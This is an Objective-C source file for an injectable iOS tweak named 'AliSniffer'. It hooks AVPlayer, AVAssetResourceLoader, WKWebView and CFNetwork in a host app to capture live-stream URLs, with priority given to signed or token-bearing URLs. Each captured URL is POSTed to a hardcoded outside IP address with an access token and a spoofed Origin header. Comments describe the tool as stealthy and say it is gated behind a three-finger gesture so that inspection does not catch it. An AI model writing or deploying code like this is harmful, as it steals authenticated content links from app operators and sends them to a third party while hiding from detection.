// AliSniffer.m — 移植版（AV + WK + CF 三路）
// 思路与“另一个能抓到的插件”一致：AVAssetResourceLoader 包裹、AVPlayer 入点、WKWebView 导航、CFReadStream 兜底。
// 关键点：签名/存在性校验；三指三击启用；30s 自动撤销；auth_key优先；上报+弹窗+复制；去重。
// 需要与工程内 fishhook.c/h 一起编译。

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <WebKit/WebKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import "fishhook.h"

#pragma mark - 配置

static NSString * const kPushHost  = @"http://139.155.57.242:8088";
static NSString * const kPushToken = @"@Yy166431";
static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }

static const NSTimeInterval kDedupeWindow = 60.0;
static const BOOL kPopupOnAuth  = YES;
static const BOOL kPopupOnPlain = YES;
static const NSTimeInterval kAutoDisableAfter = 30.0;   // 三指启用后 30s 自动撤销

#ifndef DEBUG_LOG
#define DEBUG_LOG 0
#endif
#if DEBUG_LOG
#define LOG(fmt, ...) NSLog((@"[AliPort] " fmt), ##__VA_ARGS__)
#else
#define LOG(...)
#endif

static dispatch_queue_t gq;
static NSMutableDictionary<NSString*, NSDate*> *g_seen;
static BOOL g_enabled = NO;
static dispatch_source_t g_autoTimer;

#pragma mark - 公共工具

static inline void on_main(void(^blk)(void)){
    if (!blk) return;
    if ([NSThread isMainThread]) blk(); else dispatch_async(dispatch_get_main_queue(), blk);
}
static void popup(NSString *title, NSString *msg, NSString *copyText){
    if (!msg) return;
    on_main(^{
        @try{
            UIWindow *win = nil;
            if (@available(iOS 13.0,*)) {
                for (UIWindowScene *sc in UIApplication.sharedApplication.connectedScenes){
                    if (sc.activationState==UISceneActivationStateForegroundActive){
                        for (UIWindow *w in sc.windows) if (w.isKeyWindow){ win = w; break; }
                        if (win) break;
                    }
                }
            }
            if (!win) win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
            UIViewController *vc = win.rootViewController;
            while (vc.presentedViewController) vc = vc.presentedViewController;

            UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
            if (copyText.length){
                [ac addAction:[UIAlertAction actionWithTitle:@"复制URL" style:UIAlertActionStyleDefault handler:^(__unused UIAlertAction *a){
                    UIPasteboard.generalPasteboard.string = copyText;
                }]];
            }
            [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:ac animated:YES completion:nil];
        }@catch(__unused NSException *e){}
    });
}

static BOOL hasAuthLike(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    return [s containsString:@"auth_key="] ||
           [s containsString:@"txsecret="] ||
           [s containsString:@"txkey="]    ||
           [s containsString:@"sign="]     ||
           [s containsString:@"token="];
}
static BOOL looksLikeStream(NSString *u){
    if (!u) return NO;
    NSString *s = u.lowercaseString;
    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".mp4"] || [s containsString:@".ts"] || [s hasPrefix:@"rtmp://"]) return YES;
    if ([s containsString:@".php"] || [s containsString:@"phonelive"] || [s containsString:@"replay"] || [s containsString:@"pull."] || [s containsString:@"live"]) return YES;
    if (hasAuthLike(u)) return YES;
    return NO;
}
static BOOL dedupe_skip(NSString *u){
    if (!u) return YES;
    __block BOOL skip = NO;
    dispatch_sync(gq, ^{
        NSDate *last = g_seen[u];
        NSDate *now  = [NSDate date];
        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
        else { g_seen[u] = now; skip = NO; }
    });
    return skip;
}
static void postText(NSString *text){
    if (!text) return;
    __block NSInteger idx = 0;
    NSArray *paths = kPushPaths();
    __block void (^tryNext)(void) = ^{
        if (idx >= (NSInteger)paths.count) return;
        NSString *url = [kPushHost stringByAppendingString:paths[idx++]];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
        req.HTTPMethod = @"POST";
        [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
        [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
        [req setValue:@"https://app.kuniunet.com/" forHTTPHeaderField:@"Origin"];
        req.HTTPBody = [text dataUsingEncoding:NSUTF8StringEncoding];
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
            NSInteger sc = [r isKindOfClass:NSHTTPURLResponse.class] ? ((NSHTTPURLResponse*)r).statusCode : -1;
            if (e || sc<200 || sc>=300) tryNext();
        }] resume];
    }; tryNext();
}
static void handleURL(NSString *u, NSString *from){
    if (!g_enabled) return;                           // 只在启用窗口内抓
    if (!u || !looksLikeStream(u)) return;
    if (dedupe_skip(u)) return;
    BOOL auth = hasAuthLike(u);
    NSString *title = auth ? @"抓到 URL（auth_key 优先）" : @"抓到 URL";
    NSString *msg   = from ? [NSString stringWithFormat:@"%@\n%@", from, u] : u;
    postText(u);
    if (auth){ if (kPopupOnAuth)  { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
    else     { if (kPopupOnPlain) { popup(title, msg, u); UIPasteboard.generalPasteboard.string = u; } }
}

#pragma mark - A) AV 播放链路（ResourceLoader 包裹 + AVPlayer 入点）

// —— ResourceLoader 代理包装（只读透传）
@interface SNF_RLProxy : NSObject<AVAssetResourceLoaderDelegate>
@property (nonatomic, weak) id<AVAssetResourceLoaderDelegate> real;
@end
@implementation SNF_RLProxy
- (BOOL)resourceLoader:(AVAssetResourceLoader *)loader shouldWaitForLoadingOfRequestedResource:(AVAssetResourceLoadingRequest *)loadingRequest {
    @try {
        NSURL *u = loadingRequest.request ? loadingRequest.request.URL : nil;
        if (!u) u = [loadingRequest valueForKeyPath:@"request.URL"];
        if (u.absoluteString.length) dispatch_async(gq, ^{ handleURL(u.absoluteString, @"ResourceLoader"); });
    } @catch (__unused NSException *e) {}
    if ([self.real respondsToSelector:_cmd])
        return ((BOOL(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, loadingRequest);
    return NO;
}
- (void)resourceLoader:(AVAssetResourceLoader *)loader didCancelLoadingRequest:(AVAssetResourceLoadingRequest *)loadingRequest {
    if ([self.real respondsToSelector:_cmd])
        ((void(*)(id,SEL,id,id))objc_msgSend)(self.real, _cmd, loader, loadingRequest);
}
@end

static IMP  orig_rl_setDelegate = NULL;
static void snf_rl_setDelegate(id self, SEL _cmd, id delegate, id queue){
    id wrap = delegate;
    @try{
        if (delegate && ![delegate isKindOfClass:SNF_RLProxy.class]){
            SNF_RLProxy *p = [SNF_RLProxy new]; p.real = delegate; wrap = p;
        }
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL,id,id))orig_rl_setDelegate)(self,_cmd,wrap,queue);
}
static void install_resource_loader_wrap(void){
    Class RL = objc_getClass("AVAssetResourceLoader");
    if (!RL) return;
    Method m = class_getInstanceMethod(RL, sel_getUid("setDelegate:queue:"));
    if (!m) return;
    const char *enc = method_getTypeEncoding(m);
    if (!enc || enc[0] != 'v') return;   // 简单校验
    orig_rl_setDelegate = method_getImplementation(m);
    method_setImplementation(m, (IMP)snf_rl_setDelegate);
    LOG("RL proxy installed");
}

// —— AVPlayer 入点：replaceCurrentItem/setCurrentItem
static IMP orig_replaceItem = NULL, orig_setItem = NULL;
static void sniff_item(AVPlayerItem *item, NSString *from){
    @try{
        AVURLAsset *asset = (AVURLAsset *)item.asset;
        if ([asset isKindOfClass:AVURLAsset.class]) {
            NSString *u = asset.URL.absoluteString;
            if (u.length) dispatch_async(gq, ^{ handleURL(u, from); });
        }
        // 同时把 RL 代理也挂上（有的播放器先设 item 后再装 RL）
        AVAssetResourceLoader *rl = asset.resourceLoader;
        if (rl && ![rl.delegate isKindOfClass:SNF_RLProxy.class]){
            SNF_RLProxy *p = [SNF_RLProxy new]; p.real = rl.delegate;
            [rl setDelegate:p queue:dispatch_get_main_queue()];
        }
    }@catch(__unused NSException *e){}
}
static void snf_replaceItem(id self, SEL _cmd, AVPlayerItem *item){
    sniff_item(item, @"AVPlayer.replaceItem");
    ((void(*)(id,SEL,id))orig_replaceItem)(self,_cmd,item);
}
static void snf_setItem(id self, SEL _cmd, AVPlayerItem *item){
    sniff_item(item, @"AVPlayer.setCurrentItem");
    ((void(*)(id,SEL,id))orig_setItem)(self,_cmd,item);
}
static void install_avplayer(void){
    Class P = objc_getClass("AVPlayer");
    if (!P) return;
    Method m1 = class_getInstanceMethod(P, sel_getUid("replaceCurrentItemWithPlayerItem:"));
    if (m1){ orig_replaceItem = method_getImplementation(m1); method_setImplementation(m1,(IMP)snf_replaceItem); }
    Method m2 = class_getInstanceMethod(P, sel_getUid("setCurrentItem:"));
    if (m2){ orig_setItem = method_getImplementation(m2); method_setImplementation(m2,(IMP)snf_setItem); }
    LOG("AVPlayer hooks installed");
}

#pragma mark - B) WKWebView 链路（导航代理包装）

@interface SNF_WKProxy : NSObject<WKNavigationDelegate>
@property (nonatomic, weak) id<WKNavigationDelegate> real;
@end
@implementation SNF_WKProxy
- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction decisionHandler:(void (^)(WKNavigationActionPolicy))decisionHandler {
    @try{
        NSString *u = navigationAction.request.URL.absoluteString;
        if (u.length) dispatch_async(gq, ^{ handleURL(u, @"WKNavigation"); });
    }@catch(__unused NSException *e){}
    if ([self.real respondsToSelector:_cmd])
        ((void(*)(id,SEL,id,id,id))objc_msgSend)(self.real,_cmd,webView,navigationAction,decisionHandler);
    else decisionHandler(WKNavigationActionPolicyAllow);
}
@end

static IMP orig_wk_setNav = NULL;
static void snf_setNav(id self, SEL _cmd, id delegate){
    id wrap = delegate;
    @try{
        if (delegate && ![delegate isKindOfClass:SNF_WKProxy.class]){
            SNF_WKProxy *p = [SNF_WKProxy new]; p.real = delegate; wrap = p;
        }
    }@catch(__unused NSException *e){}
    ((void(*)(id,SEL,id))orig_wk_setNav)(self,_cmd,wrap);
}
static void install_wk(void){
    Class WK = objc_getClass("WKWebView");
    if (!WK) return;
    Method m = class_getInstanceMethod(WK, sel_getUid("setNavigationDelegate:"));
    if (!m) return;
    orig_wk_setNav = method_getImplementation(m);
    method_setImplementation(m, (IMP)snf_setNav);
    LOG("WK wrap installed");
}

#pragma mark - C) CFNetwork 兜底（fishhook）

static CFReadStreamRef (*orig_CFReadStreamCreateForHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef);
static CFReadStreamRef (*orig_CFReadStreamCreateForStreamedHTTPRequest)(CFAllocatorRef, CFHTTPMessageRef, CFReadStreamRef);

static NSString* urlFromMsg(CFHTTPMessageRef msg){
    if (!msg) return nil;
    CFURLRef url = CFHTTPMessageCopyRequestURL(msg);
    if (!url) return nil;
    NSString *s = ((__bridge_transfer NSURL*)url).absoluteString;
    return s;
}
static CFReadStreamRef snf_CFReadStreamCreateForHTTPRequest(CFAllocatorRef alloc, CFHTTPMessageRef msg){
    @try{ NSString *u = urlFromMsg(msg); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream"); }); }@catch(__unused NSException *e){}
    return orig_CFReadStreamCreateForHTTPRequest ? orig_CFReadStreamCreateForHTTPRequest(alloc,msg) : NULL;
}
static CFReadStreamRef snf_CFReadStreamCreateForStreamedHTTPRequest(CFAllocatorRef alloc, CFHTTPMessageRef msg, CFReadStreamRef body){
    @try{ NSString *u = urlFromMsg(msg); if (u.length) dispatch_async(gq, ^{ handleURL(u, @"CFReadStream(streamed)"); }); }@catch(__unused NSException *e){}
    return orig_CFReadStreamCreateForStreamedHTTPRequest ? orig_CFReadStreamCreateForStreamedHTTPRequest(alloc,msg,body) : NULL;
}
static void install_cf(void){
    struct rebinding rebs[] = {
        {"CFReadStreamCreateForHTTPRequest",         (void*)snf_CFReadStreamCreateForHTTPRequest,         (void**)&orig_CFReadStreamCreateForHTTPRequest},
        {"CFReadStreamCreateForStreamedHTTPRequest", (void*)snf_CFReadStreamCreateForStreamedHTTPRequest, (void**)&orig_CFReadStreamCreateForStreamedHTTPRequest},
    };
    rebind_symbols(rebs, (sizeof rebs / sizeof rebs[0]));
    LOG("CF hooks installed");
}

#pragma mark - 开关（手势启用 / 30s 自动撤销）

static void enable_all(void){
    if (g_enabled) return;
    g_enabled = YES;
    // 安装三路
    install_resource_loader_wrap();
    install_avplayer();
    install_wk();
    install_cf();
    popup(@"AliSniffer", @"已启用捕获（AV+WK+CF）——30 秒后自动关闭；再次三指三击可立即关闭", nil);

    // 自动关闭
    if (g_autoTimer) { dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
    g_autoTimer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
    dispatch_source_set_timer(g_autoTimer, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kAutoDisableAfter*NSEC_PER_SEC)), DISPATCH_TIME_FOREVER, NSEC_PER_SEC);
    dispatch_source_set_event_handler(g_autoTimer, ^{
        g_enabled = NO;
        if (g_autoTimer){ dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
        popup(@"AliSniffer", @"已自动关闭捕获", nil);
    });
    dispatch_resume(g_autoTimer);
}
static void disable_all(void){
    if (!g_enabled) return;
    g_enabled = NO;
    if (g_autoTimer){ dispatch_source_cancel(g_autoTimer); g_autoTimer = nil; }
    popup(@"AliSniffer", @"已手动关闭捕获", nil);
}
static void tripleTap(UIGestureRecognizer *gr){
    if (gr.state != UIGestureRecognizerStateRecognized) return;
    if (g_enabled) disable_all(); else enable_all();
}
static void installGesture(void){
    on_main(^{
        @try{
            UIWindow *win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
            if (!win) return;
            UITapGestureRecognizer *tap = [[UITapGestureRecognizer alloc] init];
            tap.numberOfTouchesRequired = 3;
            tap.numberOfTapsRequired    = 3;
            [win addGestureRecognizer:tap];
            class_addMethod([tap class], sel_getUid("snf_fire"), (IMP)tripleTap, "v@:@");
            [tap addTarget:tap action:sel_getUid("snf_fire")];
            popup(@"AliSniffer 已加载（隐身）", @"三指三击屏幕：启/停捕获；默认关闭，避免被巡检。", nil);
        }@catch(__unused NSException *e){}
    });
}

#pragma mark - 入口

__attribute__((constructor))
static void AliPortInit(void){
    @try{
        if (!gq)    gq    = dispatch_queue_create("com.aliport.queue", DISPATCH_QUEUE_SERIAL);
        if (!g_seen) g_seen = [NSMutableDictionary dictionary];
        installGesture();                 // 只装手势，避免启动即被扫
    }@catch(__unused NSException *e){}
}
